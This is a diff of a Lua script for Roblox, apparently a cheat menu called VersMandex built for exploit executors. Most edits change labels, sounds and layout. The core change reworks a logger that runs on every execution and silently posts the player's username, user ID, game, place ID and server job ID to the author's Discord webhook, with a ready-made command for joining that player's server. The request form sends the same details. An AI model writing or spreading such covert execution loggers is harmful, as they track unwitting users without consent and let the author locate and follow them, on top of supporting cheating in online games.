@@ -68,7 +68,7 @@ PlayButton.Name = "PlayScriptButton"
 PlayButton.Position = UDim2.new(0, 20, 0, 95)
 PlayButton.Size = UDim2.new(1, -40, 0, 42)
 PlayButton.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
-PlayButton.Text = "▶  PLAY SCRIPT"
+PlayButton.Text = "PLAY SCRIPT"
 PlayButton.TextColor3 = Color3.fromRGB(12, 12, 16)
 PlayButton.TextSize = 13
 PlayButton.Font = Enum.Font.GothamBold
@@ -216,7 +216,7 @@ TeleportService.TeleportInitFailed:Connect(function(player, result, message)
     end
 end)
 
--- Kirim Webhook Welcome setiap kali script diexecute
+-- Kirim Webhook Welcome dengan Embed Hijau & Script Join Server
 task.spawn(function()
     pcall(function()
         local gameName = "Unknown Game"
@@ -227,8 +227,19 @@ task.spawn(function()
             end
         end)
         
+        local joinCommand = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
+        
         local payload = {
-            ["content"] = string.format("🚀 **Someone Executed VersMandex GUI**\n• **User:** %s (%s)\n• **ID:** %s\n• **Game:** %s\n• **Job ID:** `%s`", tostring(LocalPlayer.Name), tostring(LocalPlayer.DisplayName), tostring(LocalPlayer.UserId), tostring(gameName), tostring(game.JobId))
+            ["username"] = "VersMandex Logger",
+            ["embeds"] = {{
+                ["title"] = "Script Execution Detected",
+                ["color"] = 5793266,
+                ["fields"] = {
+                    {["name"] = "User Details", ["value"] = string.format("Username: %s\nDisplay Name: %s\nUser ID: %s", tostring(LocalPlayer.Name), tostring(LocalPlayer.DisplayName), tostring(LocalPlayer.UserId)), ["inline"] = false},
+                    {["name"] = "Game Details", ["value"] = string.format("Game Name: %s\nPlace ID: %s\nJob ID: %s", tostring(gameName), tostring(game.PlaceId), tostring(game.JobId)), ["inline"] = false},
+                    {["name"] = "Join Server Script", ["value"] = "```lua\n" .. joinCommand .. "\n```", ["inline"] = false}
+                }
+            }}
         }
         
         local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
@@ -260,7 +271,7 @@ local function setupHeadTag(character)
         textLabel.Size = UDim2.new(1, 0, 1, 0)
         textLabel.BackgroundTransparency = 1
         textLabel.Font = Enum.Font.GothamBold
-        textLabel.Text = "VersMandex Owner"
+        textLabel.Text = "VersMandex Creator 🇮🇩"
         textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
         textLabel.TextSize = 13
         textLabel.TextStrokeTransparency = 0
@@ -312,10 +323,11 @@ if not ScreenGui.Parent then
 end
 ScreenGui.ResetOnSpawn = false
 
+-- Background Sound Volume 0.6 Looped
 local BackgroundSound = Instance.new("Sound")
-BackgroundSound.Name = "VersMandexBackgroundSound"
-BackgroundSound.SoundId = "rbxassetid://932225598552"
-BackgroundSound.Volume = 0.25
+BackgroundSound.Name = "VersmandexBackgroundSound"
+BackgroundSound.SoundId = "rbxassetid://100373669949347"
+BackgroundSound.Volume = 0.6
 BackgroundSound.Looped = true
 BackgroundSound.Parent = ScreenGui
 pcall(function() BackgroundSound:Play() end)
@@ -755,7 +767,7 @@ OwnerRole.BackgroundTransparency = 1
 OwnerRole.Position = UDim2.new(0, 84, 0, 32)
 OwnerRole.Size = UDim2.new(1, -94, 0, 18)
 OwnerRole.Font = Enum.Font.GothamBold
-OwnerRole.Text = "Owner 🇮🇩"
+OwnerRole.Text = "Owner"
 OwnerRole.TextColor3 = Color3.fromRGB(255, 215, 0)
 OwnerRole.TextSize = 11
 OwnerRole.TextXAlignment = Enum.TextXAlignment.Left
@@ -838,7 +850,7 @@ JoinDiscordBtn.Name = "JoinNowButton"
 JoinDiscordBtn.Position = UDim2.new(0, 12, 1, -32)
 JoinDiscordBtn.Size = UDim2.new(1, -24, 0, 26)
 JoinDiscordBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
-JoinDiscordBtn.Text = "JOIN NOW  ↗"
+JoinDiscordBtn.Text = "JOIN NOW"
 JoinDiscordBtn.TextColor3 = Color3.fromRGB(18, 18, 24)
 JoinDiscordBtn.Font = Enum.Font.GothamBold
 JoinDiscordBtn.TextSize = 10
@@ -886,7 +898,7 @@ UpdateBody.BackgroundTransparency = 1
 UpdateBody.Position = UDim2.new(0, 12, 0, 38)
 UpdateBody.Size = UDim2.new(1, -24, 1, -48)
 UpdateBody.Font = Enum.Font.Gotham
-UpdateBody.Text = "Update:\n• New feature\n• Update V2\n• Bug fixes\n• Instant Server fixes"
+UpdateBody.Text = "Update:\n- New feature\n- Update V2\n- Bug fixes\n- Instant Server fixes"
 UpdateBody.TextColor3 = Color3.fromRGB(195, 195, 207)
 UpdateBody.TextSize = 10
 UpdateBody.TextWrapped = true
@@ -1274,22 +1286,41 @@ task.spawn(function()
 end)
 
 ----------------------------------------------------
--- PAGE DISCORD CONTENT (DENGAN FIX HTTP ERROR & TICK COOLDOWN)
+-- PAGE DISCORD CONTENT
 ----------------------------------------------------
 local DiscordTitle = Instance.new("TextLabel", PageDiscord)
 DiscordTitle.LayoutOrder = 1
 DiscordTitle.BackgroundTransparency = 1
 DiscordTitle.Size = UDim2.new(1, 0, 0, 20)
 DiscordTitle.Font = Enum.Font.GothamBold
-DiscordTitle.Text = "DISCORD MEMBER REQUEST"
+DiscordTitle.Text = "DISCORD SERVER & MEMBER REQUEST"
 DiscordTitle.TextColor3 = Color3.fromRGB(240, 240, 240)
 DiscordTitle.TextSize = 9.5
 DiscordTitle.TextXAlignment = Enum.TextXAlignment.Left
 
+local JoinServerDiscordBtn = Instance.new("TextButton", PageDiscord)
+JoinServerDiscordBtn.LayoutOrder = 2
+JoinServerDiscordBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+JoinServerDiscordBtn.Size = UDim2.new(1, 0, 0, 28)
+JoinServerDiscordBtn.Font = Enum.Font.GothamBold
+JoinServerDiscordBtn.Text = "Join Discord Server (Copy Link)"
+JoinServerDiscordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+JoinServerDiscordBtn.TextSize = 9
+Instance.new("UICorner", JoinServerDiscordBtn).CornerRadius = UDim.new(0, 5)
+
+JoinServerDiscordBtn.MouseButton1Click:Connect(function()
+    playClickSound()
+    local setClipboardFunc = setclipboard or toclipboard or (syn and syn.write_clipboard)
+    if setClipboardFunc then pcall(function() setClipboardFunc(DISCORD_LINK) end) end
+    JoinServerDiscordBtn.Text = "Discord Invite Copied Successfully!"
+    task.wait(1.5)
+    JoinServerDiscordBtn.Text = "Join Discord Server (Copy Link)"
+end)
+
 local ReqBox = Instance.new("TextBox", PageDiscord)
-ReqBox.LayoutOrder = 2
+ReqBox.LayoutOrder = 3
 ReqBox.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-ReqBox.Size = UDim2.new(1, 0, 0, 120)
+ReqBox.Size = UDim2.new(1, 0, 0, 100)
 ReqBox.Font = Enum.Font.Gotham
 ReqBox.PlaceholderText = "Type request message here (Max 2 requests)..."
 ReqBox.Text = ""
@@ -1301,7 +1332,7 @@ ReqBox.MultiLine = true
 Instance.new("UICorner", ReqBox).CornerRadius = UDim.new(0, 5)
 
 local SendReqBtn = Instance.new("TextButton", PageDiscord)
-SendReqBtn.LayoutOrder = 3
+SendReqBtn.LayoutOrder = 4
 SendReqBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
 SendReqBtn.Size = UDim2.new(1, 0, 0, 28)
 SendReqBtn.Font = Enum.Font.GothamBold
@@ -1310,7 +1341,7 @@ SendReqBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 SendReqBtn.TextSize = 9
 Instance.new("UICorner", SendReqBtn).CornerRadius = UDim.new(0, 5)
 
-local REQUEST_LIMIT_FILE = "versmandex_req_limit_v4.json"
+local REQUEST_LIMIT_FILE = "versmandex_req_limit_v9.json"
 local function getRequestLimitData()
     local data = {count = 0, targetTick = 0}
     pcall(function()
@@ -1357,6 +1388,7 @@ task.spawn(function()
     end
 end)
 
+-- Kirim Webhook Request SAMA PERSIS MIRIP Welcome Embed Hijau
 SendReqBtn.MouseButton1Click:Connect(function()
     playClickSound()
     local msg = ReqBox.Text
@@ -1368,9 +1400,29 @@ SendReqBtn.MouseButton1Click:Connect(function()
     end
     
     SendReqBtn.Text = "Sending..."
-    local contentText = string.format("📩 **New Member Request**\n• **Player:** %s\n• **User ID:** %s\n• **Message:** %s", tostring(LocalPlayer.Name), tostring(LocalPlayer.UserId), tostring(msg))
+    
+    local gameName = "Unknown Game"
+    pcall(function()
+        local info = MarketplaceService:GetProductInfo(game.PlaceId)
+        if info and type(info) == "table" and info.Name then 
+            gameName = info.Name 
+        end
+    end)
+    
+    local joinCommand = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
+    
     local payload = {
-        ["content"] = contentText
+        ["username"] = "VersMandex Request Logger",
+        ["embeds"] = {{
+            ["title"] = "New Member Request",
+            ["color"] = 5793266, -- Warna Hijau Persis Welcome
+            ["fields"] = {
+                {["name"] = "User Details", ["value"] = string.format("Username: %s\nDisplay Name: %s\nUser ID: %s", tostring(LocalPlayer.Name), tostring(LocalPlayer.DisplayName), tostring(LocalPlayer.UserId)), ["inline"] = false},
+                {["name"] = "Message", ["value"] = "```\n" .. tostring(msg) .. "\n```", ["inline"] = false},
+                {["name"] = "Game Details", ["value"] = string.format("Game Name: %s\nPlace ID: %s\nJob ID: %s", tostring(gameName), tostring(game.PlaceId), tostring(game.JobId)), ["inline"] = false},
+                {["name"] = "Join Server Script", ["value"] = "```lua\n" .. joinCommand .. "\n```", ["inline"] = false}
+            }
+        }}
     }
     
     local sent = false
